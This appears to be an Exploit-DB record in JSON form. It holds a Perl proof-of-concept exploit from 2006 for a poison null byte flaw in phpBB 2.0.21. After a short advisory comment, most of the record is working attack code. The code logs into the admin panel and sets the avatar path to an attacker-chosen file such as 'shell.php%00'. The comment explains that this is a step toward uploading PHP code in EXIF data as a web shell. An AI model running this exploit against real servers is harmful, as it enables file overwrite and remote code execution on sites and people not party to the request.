{
  "id": "2348",
  "title": "phpBB 2.0.21 - Poison Null Byte Remote File Upload",
  "cve": null,
  "vuln_type": "file_upload",
  "code": "#!/usr/bin/perl -w\r\n# Author: ShAnKaR\r\n# Title: multiple PHP application poison NULL byte vulnerability\r\n# Applications: phpBB 2.0.21, punBB 1.2.12\r\n# Threat Level: Critical\r\n# Original advisory (in Russian): http://www.security.nnov.ru/Odocument221.html\r\n# \r\n# Poison  NULL  byte vulnerability for perl CGI applications was described\r\n# in  [1].  ShAnKaR  noted, that same vulnerability also affects different\r\n# PHP  applications.  An  example of vulnerable applications are phpBB and\r\n# punBB.\r\n# \r\n# Vulnerability  can  be  used  to  upload  or  replace arbitrary files on\r\n# server, e.g. PHP scripts, by adding \"poison NULL\" (%00) to filename.\r\n# \r\n# In  case  of  phpBB and punBB vulnerability can be exploited by changing\r\n# location  of avatar file and uploading avatar file with PHP code in EXIF\r\n# data.\r\n# \r\n# A PoC exploit to change Avatar file location for phpBB:\r\n# \r\n# \r\n\r\nuse HTTP::Cookies;\r\nuse LWP;\r\nuse URI::Escape;\r\nunless(@ARGV){die \"USE:\\n./phpbb.pl localhost.com/forum/ admin pass images/avatars/shell.php [d(DEBUG)]\\n\"}\r\nmy $ua = LWP::UserAgent->new(agent=>'Mozilla/4.0 (compatible; Windows 5.1)');\r\n$ua->cookie_jar( HTTP::Cookies->new());\r\n\r\n$url='http://'.$ARGV[0].'/login.php';\r\n$data=\"username=\".$ARGV[1].\"&password=\".$ARGV[2].\"&login=1\";\r\nmy $req = new HTTP::Request 'POST',$url;\r\n$req->content_type('application/x-www-form-urlencoded');\r\n$req->content($data);\r\nmy $res = $ua->request($req);\r\n\r\n$res=$ua->get('http://'.$ARGV[0].'/login.php');\r\n$content=$res->content;\r\n$content=~ m/true&sid=([^\"]+)\"/g;\r\nif($ARGV[4]){\r\n$content=$res->content;\r\nprint $content;\r\n}\r\n$url='http://'.$ARGV[0].'/login.php';\r\n$data=\"username=\".$ARGV[1].\"&password=\".$ARGV[2].\"&login=1&admin=1\";\r\n$req = new HTTP::Request 'POST',$url;\r\n$req->content_type('application/x-www-form-urlencoded');\r\n$req->content($data);\r\n$res = $ua->request($req);\r\n\r\n$url='http://'.$ARGV[0].'/admin/admin_board.php?sid='.$1;\r\n$data=\"submit=submit&allow_avatar_local=1&avatar_path=\".$ARGV[3].\"%00\";\r\n$req = new HTTP::Request 'POST',$url;\r\n$req->content_type('application/x-www-form-urlencoded');\r\n$req->content($data);\r\n$res = $ua->request($req);\r\nif($ARGV[4]){\r\n$content=$res->content;\r\nprint $content;\r\n}\r\n\r\n# milw0rm.com [2006-09-11]",
  "url": "https://www.exploit-db.com/exploits/2348"
}